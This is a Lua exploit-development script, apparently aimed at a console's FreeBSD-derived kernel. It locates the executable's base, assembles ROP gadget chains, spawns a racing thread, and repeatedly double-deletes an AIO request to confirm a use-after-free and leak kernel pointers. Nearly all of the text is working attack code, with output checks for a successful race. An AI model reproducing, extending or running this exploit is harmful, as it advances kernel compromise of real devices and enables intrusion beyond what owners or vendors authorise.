-- CRASH_CLASS: HIGH
-- PROBE 65f: aio_multi_delete TOCTOU race v3
--
-- 65d/65e both got state=0x80020010. But 352a/352p got state=0x00000000.
-- Differences: 352p didn't call 670 (AIO init), used /dev/zero (instant
-- completion), and 352a called 666 (cancel) before 662 (delete).
--
-- This probe:
--   [A] Replicate 352p exactly — no 670, /dev/zero, confirm state=0x0
--   [B] Test: does 670 init break deletes?
--   [C] Test: cancel (666) before delete — needed?
--   [D] If delete works, run the TOCTOU race

print("=== PROBE 65f: aio_multi_delete race v3 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV + SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- Open /dev/zero
local fd_zero = -1
repeat
    local ok, rv = pcall(function() return mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)) end)
    if ok then fd_zero = sgn(rv) end
until true
print("/dev/zero fd=" .. fd_zero)

-- Shared AIO buffers (matching 352p style exactly)
local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)

local function zero_range(addr, len)
    for i = 0, len - 1, 4 do wd(addr + i, 0) end
end

local function fill_req(base, fd)
    wq(base + 0x00, uint64(0))      -- offset
    wq(base + 0x08, uint64(16))     -- length
    local bh, bl = get_hi_lo(uint64(N(data)))
    wd(base + 0x10, bl); wd(base + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result)))
    wd(base + 0x18, rl); wd(base + 0x1C, rh)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function aio_submit(fd)
    fill_req(N(reqs), fd)
    wd(N(result), 0)
    wd(N(ids), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids)))
    end)
    return ok and sgn(rv) or nil, rd(N(ids)) or 0, rd(N(result)) or 0
end

local function aio_poll(id)
    wd(N(ids), id)
    wd(N(states), 0)
    local ok, rv = pcall(function()
        return mk(664)(uint64(N(ids)), uint64(1), uint64(N(states)))
    end)
    return ok and sgn(rv) or nil, rd(N(states)) or 0
end

local function aio_cancel(id)
    wd(N(ids), id)
    wd(N(states), 0)
    local ok, rv = pcall(function()
        return mk(666)(uint64(N(ids)), uint64(1), uint64(N(states)))
    end)
    return ok and sgn(rv) or nil, rd(N(states)) or 0
end

local function aio_delete(id)
    wd(N(ids), id)
    wd(N(states), 0xDEADDEAD)
    local ok, rv = pcall(function()
        return mk(662)(uint64(N(ids)), uint64(1), uint64(N(states)))
    end)
    return ok and sgn(rv) or nil, rd(N(states)) or 0
end

-- [A] Replicate 352p exactly (no 670)
print("")
print("[A] 352p replication (no AIO init)")
local s1_ret, s1_id, s1_res = aio_submit(fd_zero)
print(string.format("  submit: ret=%s id=0x%08X result=0x%08X", tostring(s1_ret), s1_id, s1_res))

local p1_ret, p1_state = aio_poll(s1_id)
print(string.format("  poll:   ret=%s state=0x%08X", tostring(p1_ret), p1_state))

local d1_ret, d1_state = aio_delete(s1_id)
print(string.format("  delete: ret=%s state=0x%08X  (%s)", tostring(d1_ret), d1_state,
    d1_state == 0 and "SUCCESS" or "FAIL"))

-- Double delete (should return 0x80020003 = unknown)
local d1b_ret, d1b_state = aio_delete(s1_id)
print(string.format("  delete2: ret=%s state=0x%08X", tostring(d1b_ret), d1b_state))

if not alive() then print("DEAD after [A]"); return end

-- [B] With cancel before delete
print("")
print("[B] cancel before delete")
local s2_ret, s2_id, s2_res = aio_submit(fd_zero)
print(string.format("  submit: ret=%s id=0x%08X result=0x%08X", tostring(s2_ret), s2_id, s2_res))
local c2_ret, c2_state = aio_cancel(s2_id)
print(string.format("  cancel: ret=%s state=0x%08X", tostring(c2_ret), c2_state))
local d2_ret, d2_state = aio_delete(s2_id)
print(string.format("  delete: ret=%s state=0x%08X  (%s)", tostring(d2_ret), d2_state,
    d2_state == 0 and "SUCCESS" or "FAIL"))

if not alive() then print("DEAD after [B]"); return end

-- [C] With 670 init, then submit+delete
print("")
print("[C] after AIO init (670)")
pcall(function() mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
local s3_ret, s3_id, s3_res = aio_submit(fd_zero)
print(string.format("  submit: ret=%s id=0x%08X result=0x%08X", tostring(s3_ret), s3_id, s3_res))
local d3_ret, d3_state = aio_delete(s3_id)
print(string.format("  delete: ret=%s state=0x%08X  (%s)", tostring(d3_ret), d3_state,
    d3_state == 0 and "SUCCESS" or "FAIL"))

if not alive() then print("DEAD after [C]"); return end

-- [D] Determine which path gives state=0, then race it
print("")
print("[D] RACE (using working delete path)")

-- Pick the method that returned state=0
local use_cancel = false
local working = false
if d1_state == 0 then
    print("  using: direct delete (352p style)")
    working = true
elseif d2_state == 0 then
    print("  using: cancel + delete")
    use_cancel = true
    working = true
elseif d3_state == 0 then
    print("  using: post-670 delete")
    working = true
else
    print("  ERROR: no delete path returns state=0")
    print("  states: direct=" .. string.format("0x%X", d1_state) ..
        " cancel+del=" .. string.format("0x%X", d2_state) ..
        " post-670=" .. string.format("0x%X", d3_state))
    print("  Cannot race without a working delete. Need different AIO state.")
end

if not working then
    print("")
    print("=== 65f COMPLETE (no working delete) ===")
    return
end

local RACE_ITERS = 8
local double_success = 0
local kptrs = 0

-- Separate child buffers
local ids_child = memory.alloc(0x100)
local states_child = memory.alloc(0x100)

for iter = 1, RACE_ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    -- Submit AIO
    local sr, sid, sres = aio_submit(fd_zero)
    if sr ~= 0 or sid == 0 then
        print(string.format("  iter %d: submit failed", iter))
        break
    end

    -- Cancel first if needed
    if use_cancel then
        aio_cancel(sid)
    end

    -- Prepare child
    wd(N(ids_child), sid)
    wq(N(states_child), uint64(0xBAD0DEAD))

    -- Build child ROP: sysarch + 662 + save result + thr_exit
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE)
    emit(g_pop_rdi);  emit(uint64(129))
    emit(g_pop_rsi);  emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);  emit(uint64(165))
    emit(stub)

    -- 662(ids_child, 1, states_child)
    emit(g_pop_rdi);  emit(uint64(N(ids_child)))
    emit(g_pop_rsi);  emit(uint64(1))
    emit(g_pop_rdx);  emit(uint64(N(states_child)))
    emit(g_pop_rax);  emit(uint64(662))
    emit(stub)

    -- thr_exit(0)
    emit(g_pop_rdi);  emit(uint64(0))
    emit(g_pop_rax);  emit(uint64(431))
    emit(stub)

    -- thr_param
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, g_bare_ret)
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_buf = memory.alloc(8); wq(N(tid_buf), uint64(0))
    wq(pa + 0x30, tid_buf)

    -- Spawn child
    pcall(function() mk(455)(par, uint64(0x38)) end)

    -- RACE: main thread also deletes same ID
    local main_ret, main_state = aio_delete(sid)

    -- Immediately resubmit to fill freed slot
    local rs_ret, rs_id = aio_submit(fd_zero)

    -- Wait for child
    for w = 1, 25000 do local _ = rd(sb) end

    -- Read child result
    local child_state_raw = rq(N(states_child))
    local csh, csl = get_hi_lo(child_state_raw)

    local main_ok = (main_state == 0)
    local child_ok = (csl == 0 and csh == 0)

    if main_ok and child_ok then
        double_success = double_success + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** main=0 child=0 resub_id=0x%X",
            iter, rs_id or 0))
    else
        if iter <= 3 or iter == RACE_ITERS then
            print(string.format("  iter %d: main=0x%X child=%s resub=0x%X",
                iter, main_state, fmt(child_state_raw), rs_id or 0))
        elseif iter == 4 then
            print("  ...")
        end
    end

    -- kptr check
    if csh ~= 0 and csh ~= 0xFFFFFFFF and csh >= 0xFFFF8000 then
        kptrs = kptrs + 1
        print(string.format("  iter %d: *** KPTR: %s ***", iter, fmt(child_state_raw)))
    end

    -- Clean resubmitted
    if rs_ret == 0 and rs_id and rs_id ~= 0 then
        aio_delete(rs_id)
    end
end

print("")
print("[E] SUMMARY")
print(string.format("  double deletes:  %d", double_success))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if double_success > 0 then
    print("*** RACE CONFIRMED — UAF path is live ***")
end

print("")
print("=== 65f COMPLETE ===")
